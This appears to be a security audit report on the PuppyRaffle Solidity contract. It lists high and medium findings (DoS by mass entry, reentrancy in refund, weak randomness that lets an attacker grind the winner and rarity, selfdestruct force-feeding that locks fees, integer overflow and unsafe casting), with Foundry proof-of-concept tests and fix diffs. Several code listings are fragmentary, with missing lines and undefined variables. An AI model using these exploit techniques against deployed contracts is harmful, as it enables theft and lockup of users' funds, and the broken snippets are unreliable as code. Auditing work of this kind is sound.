Protocol Summary

PuppyRaffle is a raffle protocol where players pay an entrance fee to enter a draw for a puppy NFT. Duplicate entrants are not allowed, players can refund their ticket, and a winner is drawn after the raffle duration. The pot is split 80% to the winner and 20% to the protocol feeAddress.

Executive Summary

This was a time-boxed review of the PuppyRaffle contract, using static analysis with Slither and Aderyn together with manual review. The review found 4 High, 2 Medium, 1 Low, 1 Question and 9 Informational findings. The most serious are the unbounded duplicate-check loop (DoS), the ReEntrancy in refund, the weak randomness in selectWinner, and the mishandling of ETH in withdrawFees. Every finding is tagged inline in the contract with // @AUDIT-* comments, and working Foundry tests were written for every High, Medium and Low finding (27 tests passing in total).

Findings

High

[H-1] Unchecked looping for duplicate checking in PuppyRaffle::enterRaffle function, can lead to a DoS attack with high gas fees!

Description: The enterRaffle function has an unchecked loop which can lead to an uncontrolled gas cost increase as players continue to enter the raffle. A black hat can exploit this by entering with thousands (or more) wallet addresses, making it unaffordable for later legitimate users to enter the raffle.

Impact: Uncontrolled gas cost increase can lead to a DoS attack on the protocol.

Proof of Concept: Check the test_DenialOfService_AUDIT test in the PuppyRaffleTest.t.sol file.

Here’s the full code 
    function test_DenialOfService_AUDIT() public {

        // check how much gas it costs for the first 100 players
        uint256 gasBefore = gasleft();

            playersTwo[i] = address(i + playersNum);

[H-2] External call made before state change in refund function, an open invitation for a reentrancy attack

Description: The refund function in the PuppyRaffle contract is not following the CEI (Checks-Effects-Interactions) pattern, nor does it use OpenZeppelin’s reentrancy guard. This can lead to a reentrancy attack by an attacker contract.

Impact: Reentrancy attack as a result of missing reentrancy checks and not following the CEI pattern.

Proof of Concept: Check the test_ReEntrancy_AUDIT test & ReentrancyAttacker contract in the PuppyRaffleTest.t.sol file:

Here’s the full code

        puppyRaffle = _puppyRaffle;

[H-3] Weak randomness in PuppyRaffle::selectWinner function, an attacker can grind the block values and hand-pick the winner and the puppy rarity

Description: selectWinner derives the winner from keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)) % players.length, and derives the puppy rarity from the same kind of hash. None of those inputs are actually random, since msg.sender is just whoever calls the function and the block values are chosen by the block producer, so an attacker can grind them and hand-pick both the winner and the rarity.

Impact: An attacker who can influence the block values can guarantee that they win the raffle and get the puppy rarity they want

Proof of Concept: Check the test_WeakRandomness_AUDIT and test_WeakRandomnessRarity_AUDIT tests in the PuppyRaffleTest.t.sol file:

Here’s the full code 
    function test_WeakRandomness_AUDIT() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // the attacker is playerFour (index 3) and grinds block.timestamp until they win
        uint256 startTime = block.timestamp + duration + 1;
        bool found;
        uint256 winningTimestamp;
        for (uint256 t = startTime; t < startTime + 100; t++) {
            // this copies EXACTLY the formula used inside selectWinner()
            uint256 index = uint256(
                keccak256(abi.encodePacked(address(this), t, block.difficulty))
            ) % players.length;
            if (index == 3) {
                winningTimestamp = t;
                found = true;
                break;
            }
        }
        assertTrue(found, "attacker found a winning timestamp");

        vm.warp(winningTimestamp);
        vm.roll(block.number + 1);
        console2.log("Winning timestamp found by attacker:", winningTimestamp);

        puppyRaffle.selectWinner();

        console2.log(
            "Winner is playerFour (the attacker):",
            puppyRaffle.previousWinner() == playerFour
        );
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function test_WeakRandomnessRarity_AUDIT() public {

        players[0] = playerOne;

        players[2] = playerThree;

        address attacker;
        uint256 winningIndex;
        uint256 chosenRarity;

        // grind over caller addresses until one of them picks playerFour as the
        // winner AND hands them a legendary puppy
        for (uint256 i = 0; i < 5000; i++) {
            address candidate = address(uint160(1000 + i));

            // these are the same two expressions used inside selectWinner()

            if (index == 3 && rarity > 95) {
                attacker = candidate;
                winningIndex = index;
                chosenRarity = rarity;
                break;
            }
        }

        assertTrue(
            attacker != address(0),
            "attacker found a caller for winner + legendary"
        );

        vm.prank(attacker);
        puppyRaffle.selectWinner();

        console2.log("caller address picked by attacker:", attacker);
        console2.log("winning index:", winningIndex);
        console2.log("rarity rolled by attacker:", chosenRarity);
        console2.log(
            "rarity stored on the minted token:",
            puppyRaffle.tokenIdToRarity(0)

[H-4] Mishandling of ETH in PuppyRaffle::withdrawFees function, selfdestruct can break the strict balance check and lock the fees forever

Description: withdrawFees only works while address(this).balance == uint256(totalFees), and anyone can break that equality by forcing ETH in with selfdestruct, since the contract has no receive or fallback.

Impact: Anyone can permanently block fee withdrawals with a single selfdestruct

Proof of Concept: Check the test_MishandlingOfETH_AUDIT test & ETHForcer contract in the PuppyRaffleTest.t.sol file:

Here’s the full code 
    function test_MishandlingOfETH_AUDIT() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        // after a normal draw the contract holds exactly the recorded fees,
        // which is the only state where withdrawFees is allowed to run
        console2.log("totalFees recorded:", uint256(puppyRaffle.totalFees()));
        console2.log("raffle balance:", address(puppyRaffle).balance);
        assertEq(
            address(puppyRaffle).balance,
            uint256(puppyRaffle.totalFees())
        );

        // the contract has no receive or fallback, so the only way ETH gets in
        // is by force feeding it with selfdestruct
        ETHForcer forcer = new ETHForcer{value: 1 ether}();
        forcer.attack(payable(address(puppyRaffle)));

        console2.log(
            "raffle balance after force feed:",
            address(puppyRaffle).balance
        );

        // the equality can never hold again, so the fees are stuck forever
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();

        assertGt(
            address(puppyRaffle).balance,
            uint256(puppyRaffle.totalFees())
        );
        console2.log("feeAddress balance:", address(feeAddress).balance);
        assertEq(address(feeAddress).balance, 0);
    }

        selfdestruct(target);

+        address(this).balance >= uint256(totalFees),

+    uint256 public playerFunds;

+    playerFunds += msg.value;

+    playerFunds -= entranceFee;

+    playerFunds = 0;

     // withdrawFees
-        address(this).balance == uint256(totalFees),
+        playerFunds == 0,

Medium

[M-1] Arithmetic overflow in PuppyRaffle::selectWinner, totalFees wraps around because the contract runs Solidity 0.7.6

Description: The line totalFees = totalFees + uint64(fee); runs on Solidity 0.7.6, where arithmetic overflow does not revert. It silently wraps around. As soon as the running total passes the maximum value of uint64 (18,446,744,073,709,551,615), totalFees rolls back down instead of continuing to grow, and every fee recorded after that point is wrong.

Impact: The fee record can lead to overflow.

Proof of Concept: Check the test_ArithmeticOverflow_AUDIT test in the PuppyRaffleTest.t.sol file:

Here’s the full code 
    function test_ArithmeticOverflow_AUDIT() public {
        // a separate raffle with a big entrance fee, so totalFees gets close to uint64 max
        uint256 bigEntranceFee = 1.5e19;
        PuppyRaffle bigRaffle = new PuppyRaffle(
            bigEntranceFee,
            feeAddress,
            duration
        );

        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        uint256 feePerRaffle = (4 * bigEntranceFee * 20) / 100;

        // raffle 1
        bigRaffle.enterRaffle{value: bigEntranceFee * 4}(players);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        bigRaffle.selectWinner();
        console2.log(
            "totalFees after raffle 1:",
            uint256(bigRaffle.totalFees())
        );

        // raffle 2
        bigRaffle.enterRaffle{value: bigEntranceFee * 4}(players);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        bigRaffle.selectWinner();
        console2.log(
            "totalFees after raffle 2:",
            uint256(bigRaffle.totalFees())
        );

        // the two fees should add up, but uint64 wraps around instead
        uint256 expectedWithoutOverflow = feePerRaffle * 2;
        console2.log("expected without overflow:", expectedWithoutOverflow);

        assertTrue(expectedWithoutOverflow > type(uint64).max);
        assertEq(bigRaffle.totalFees(), expectedWithoutOverflow - 2**64);
    }

+        totalFees = totalFees.add(fee);

[M-2] Unsafe casting of uint256 down to uint64 in PuppyRaffle::selectWinner, the recorded fee silently loses most of its value

Description: totalFees = totalFees + uint64(fee); casts a uint256 fee down to uint64. Explicit narrowing casts in Solidity never revert, they simply cut off the higher-order bits. Since fee is 20% of everything collected, it crosses the uint64 maximum (18,446,744,073,709,551,615, about 18.45 ETH) as soon as a single raffle collects more than roughly 92 ETH, and everything above that limit is silently dropped. Worth noting this still happens on Solidity 0.8+, because the built-in overflow checks only cover arithmetic (+, -, *), not type conversions.

Impact: totalFees records only a fraction of the real fee.

Proof of Concept: Check the test_UnsafeCasting_AUDIT test in the PuppyRaffleTest.t.sol file:

Here’s the full code 
    function test_UnsafeCasting_AUDIT() public {
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i + 100);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedFee = (playersNum * entranceFee * 20) / 100;
        uint256 truncatedFee = uint256(uint64(expectedFee));

        puppyRaffle.selectWinner();

        console2.log("expected fee:", expectedFee);
        console2.log(
            "totalFees actually recorded:",
